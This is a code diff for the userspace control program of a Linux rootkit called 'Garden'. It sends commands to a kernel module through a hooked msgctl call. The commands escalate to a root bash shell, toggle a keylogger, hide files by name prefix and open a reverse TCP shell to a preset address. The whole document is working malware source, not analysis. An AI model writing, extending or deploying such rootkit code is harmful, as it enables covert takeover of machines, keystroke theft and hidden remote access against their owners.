@@ -1,172 +1,258 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-
 /**
- * Structs
+ * Rootkit userspace command program.
+ * @author: Aaron Lichtman
  */
 
-typedef struct commands {
-	char* root;
-	char* keylogger;
-	char* enable;
-	char* disable;
-	char* file_hide;
-	char* reverse_tcp_shell;
-} commands;
+#include <limits.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/types.h>
 
+/**
+ * ##############
+ * Global Defines
+ * ##############
+ */
 
-// Each function_code property is a unique number that will be passed to
-// the LKM to indicate what function to perform.
+// Command Line Args
+#define ROOT "root"
+#define KEYLOGGER "keylogger"
+#define ENABLE "enable"
+#define DISABLE "disable"
+#define REVERSE_TCP_SHELL "rev_tcp"
+#define FILE_HIDE "hide"
+#define ADD "add"
+#define REMOVE "rm"
+#define SHOW "show"
+
+// ANSI Colors
+#define RED "\x1b[31m"
+#define GREEN "\x1b[32m"
+#define BLUE "\x1b[34m"
+#define RESET "\x1b[0m"
+
+/**
+ * #######
+ * Structs
+ * #######
+ */
+
+/**
+ *Each function_code property is a unique number that will be passed to the
+ * LKM to indicate what function to perform.
+ */
+// TODO: Extract this to an h file to avoid duplication.
 typedef struct function_code {
-	int get_root;
-	int keylogger_enable;
-	int keylogger_disable;
-	int file_hide_add;
-	int file_hide_rm;
-	int reverse_tcp_shell;
+    int get_root;
+    int keylogger_enable;
+    int keylogger_disable;
+    int file_hide_add;
+    int file_hide_rm;
+    int file_hide_show;
+    int reverse_tcp_shell;
 } function_code;
+
+function_code functionCode = {
+    .get_root = 0,
+    .keylogger_enable = 1,
+    .keylogger_disable = 2,
+    .file_hide_add = 3,
+    .file_hide_rm = 4,
+    .file_hide_show = 5,
+    .reverse_tcp_shell = 6};
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
-	int func_code;
-	char* file_hide_str;
+    int func_code;
+    char *file_hide_str;
 } action_task;
-
-/**
- * Globals
- */
-
-commands cmd = {
-	.root = "root",
-	.keylogger = "keylog",
-	.enable = "enable",
-	.disable = "disable",
-	.file_hide = "hide",
-	.show = "show",
-	.add = "add",
-	.remove = "rm",
-	.reverse_tcp_shell = "rev_tcp"
-};
-
-function_code f_code = {
-	.get_root = 0,
-	.keylogger_enable = 1,
-	.keylogger_disable = 2,
-	.file_hide_add = 3,
-	.file_hide_rm = 4,
-	.file_hide_show = 5
-	.reverse_tcp_shell = 6
-};
 
 /**
  * Printing
  */
 
+void print_red(const char *text) {
+    printf("%s %s %s", RED, text, RESET);
+}
+
+void print_green(const char *text) {
+    printf("%s %s %s", GREEN, text, RESET);
+}
+
+void print_blue(const char *text) {
+    printf("%s %s %s", BLUE, text, RESET);
+    //	printf("%s %s %s", CYAN, text, RESET);
+}
+
 void print_banner() {
-	char* banner = "\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
+    char *banner =
+        "\n\t ██████╗  █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗\n \
 \t██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║\n \
 \t██║  ███╗███████║██████╔╝██║  ██║█████╗  ██╔██╗ ██║\n \
 \t██║   ██║██╔══██║██╔══██╗██║  ██║██╔══╝  ██║╚██╗██║\n \
 \t╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║ ╚████║\n \
 \t ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝\n";
 
-	printf("%s", banner);
+    print_green(banner);
 }
 
 void print_usage() {
-	printf("Welcome to the Garden.\n--------------");
-	printf("/garden root\tgives you root.\n");
-	printf("/garden keylogger [enable/disable]\ttoggles the keylogger.\n");
-	printf("/garden hide add PREFIX\t adds PREFIX to the hide list.\n");
-	printf("/garden hide rm PREFIX\t removes PREFIX from the hide list.\n");
-	printf("/garden hide ls\t shows prefixes in the hide list.\n");
-	printf("/garden rev_tcp\t opens a reverse shell using the IP and PORT configured during setup.\n");
-	exit(0);
-}
-
-// TODO: Print in colors
-
-/**
- * Uses SOME_FUNCTION to interface with rootkit. The LKM hooks this function
- * and responds to the actions as they come in.
- *
- * Returns 0 if successfully communicated, -1 otherwise.
- */
-int communicate_with_lkm(action_task* data_to_pass) {
-	return 0;
+    print_green("\nWelcome to the Garden.\n--------------\n");
+    print_green("\t/garden root\t\t\t\t - gives you root.\n");
+    print_green("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
+    print_green("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
+    print_green("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
+    print_green("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
+    print_green("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n\n");
+    exit(0);
 }
 
 /**
  * Checks for subarg. If it doesn't exist, prints usage and
  * exits (inside print_usage).
  */
-bool check_for_subarg(int idx) {
-	if (!argv[idx]) {
-		print_usage();
-	}
-	return true;
+bool check_for_subarg(int idx, char *argv[]) {
+    if (!argv[idx]) {
+        print_usage();
+    }
+    return true;
+}
+
+void handle_get_root(char *base_cmd, action_task *action) {
+    if (!strcmp(base_cmd, ROOT)) {
+        action->func_code = functionCode.get_root;
+    }
+}
+
+void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
+    if (!strcmp(base_cmd, REVERSE_TCP_SHELL)) {
+        action->func_code = functionCode.reverse_tcp_shell;
+    }
 }
 
 /**
- * CLI for interacting with the rootkit, and interfacing with the kernel module.
+ * Populates action_task* action which is ready to be communicated to kernel if
+ * keylogger action is commanded by user. Returns true if keylogger action
+ * detected, otherwise, returns false.
+ *
+ * Handles:
+ * 	$ keylogger enable
+ * 	$ keylogger disable
  */
-int main(int argc, char* argv[]) {
-	// No args entered. Display help menu.
-	if (argc == 1 || !strcmp(argv[1], "-h")) {
-		print_usage();
-		return 0;
-	}
+void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
+    if (!strcmp(base_cmd, KEYLOGGER)) {
+        if (!strcmp(subarg, ENABLE)) {  // Keylogger enable
+            action->func_code = functionCode.keylogger_enable;
+        } else if (!strcmp(subarg, DISABLE)) {  // Keylogger disable
+            action->func_code = functionCode.keylogger_disable;
+        }
+    }
+}
 
-	print_banner();
+/**
+ * Handles three commands:
+ * 	$ hide show
+ * 	$ hide add FILE
+ * 	$ hide rm FILE
+ */
+void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_task *action) {
+    if (!strcmp(base_cmd, FILE_HIDE)) {
+        if (!strcmp(subarg, SHOW)) {
+            action->func_code = functionCode.file_hide_show;
+        } else if (check_for_subarg(3, argv)) {  // Make sure the 3rd arg in $ hide [add/rm] FILE exists
+            if (!strcmp(subarg, ADD)) {
+                action->func_code = functionCode.file_hide_add;
+            } else if (!strcmp(subarg, REMOVE)) {
+                action->func_code = functionCode.file_hide_rm;
+            } else {
+                print_usage();
+            }
+            action->file_hide_str = argv[3];
+        }
+    }
+}
 
-	action_task action;
-	memset(&action. 0, sizeof(action));
+/**
+ * Uses msgctl to interface with rootkit. The LKM hooks this function
+ * and responds to the actions as they come in. Actions are marked by passing
+ * INT_MAX for the first two parameters.
+ *
+ * Returns 0 if successfully communicated, -1 otherwise.
+ */
+int communicate_with_lkm(action_task *rootkit_action) {
+    struct msqid_ds messenger;
+    memset(&messenger, 0, sizeof(struct msqid_ds));
 
-	// Single arg commands
-	char* base_cmd = argv[1];
-	if (!strcmp(base_cmd, cmd.root)) {
-		action.func_code = f_code.get_root;
-		// TODO: Just call $ kill 31337
-		return communicate_with_lkm(action);
-	} else if (!strcmp(base_cmd, cmd.reverse_tcp_shell)) {
-		action.func_code = f_code.reverse_tcp_shell;
-		return communicate_with_lkm(action);
-	}
+    if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds *)rootkit_action) == 0) {
+        print_green("Communication OK.\n");
+        return 0;
+    } else {
+        print_red("Communication failed.\n");
+        return -1;
+    }
+}
 
-	// Double arg commands
-	check_for_subarg(2);
-	char* subarg = argv[2];
+/**
+ * If the action_task struct is populated, executes task and returns true.
+ * Otherwise, returns false.
+ */
+bool execute_action_if_possible(action_task *action) {
+    if (action->func_code != -1) {
+        // printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
+        if (communicate_with_lkm(action) == 0) {
+            if (action->func_code == functionCode.get_root) {
+                const char *bash = "/bin/bash";
+                char *const argv[3] = {bash, NULL};
+                char *const envp[1] = {NULL};
+                execve(bash, argv, envp);
+            }
+        }
+        return true;
+    } else {
+        return false;
+    }
+}
 
-	if (!strcmp(base_cmd, cmd.keylogger)) {
-		if (!strcmp(subarg, cmd.enable)) {
-			action.func_code = f_code.keylogger_enable;
-		} else if (!strcmp(subarg, cmd.disable)) {
-			action.func_code = f_code.keylogger_disable;
-		} else {
-			print_usage();
-		}
-		return communicate_with_lkm(action);
-	}
+/**
+ * CLI for interacting with the rootkit and interfacing with the kernel module.
+ */
+int main(int argc, char *argv[]) {
+    print_banner();
 
-	if (!strcmp(base_cmd, cmd.file_hide)) {
-		if (!strcmp(subarg, cmd.show)) {
-			action.func_code = f_code.file_hide_show;
-			return communicate_with_lkm(action);
-		} else if (check_for_subarg(3)) { // Make sure the 3rd arg in $ hide [add/rm] FILE exists
-			if (!strcmp(subarg, function_code.file_hide_add)) {
-				action.func_code = f_code.file_hide_add;
-			} else if (!strcmp(subarg, function_code.file_hide_rm)) {
-				action.func_code = f_code.file_hide_rm;
-			} else {
-				print_usage();
-			}
+    // No args entered. Display help menu.
+    if (argc == 1 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
+        print_usage();
+        return 0;
+    }
 
-			action.file_hide_str = argv[3]
-			return communicate_with_lkm(action);
-		}
-	} else {
-		print_usage();
-	}
-	return 0;
+    // Set up action_task. This is what will be passed to the LKM to make
+    // things happen. Set the func_code to -1 initially so we can detect failure
+    // to set any options later.
+    action_task action;
+    memset(&action, 0, sizeof(action));
+    action.func_code = -1;
+
+    // Parse single arg commands
+    char *base_cmd = argv[1];
+    handle_get_root(base_cmd, &action);
+    handle_reverse_tcp_shell(base_cmd, &action);
+    execute_action_if_possible(&action);
+
+    // Parse double arg commands
+    check_for_subarg(2, argv);
+    char *subarg = argv[2];
+    handle_keylogger_action(base_cmd, subarg, &action);
+
+    // Parse triple arg commands
+    handle_file_hide_action(base_cmd, subarg, argv, &action);
+    execute_action_if_possible(&action);
+
+    // If we get here, no valid command has been entered.
+    print_usage();
+    return 0;
 }
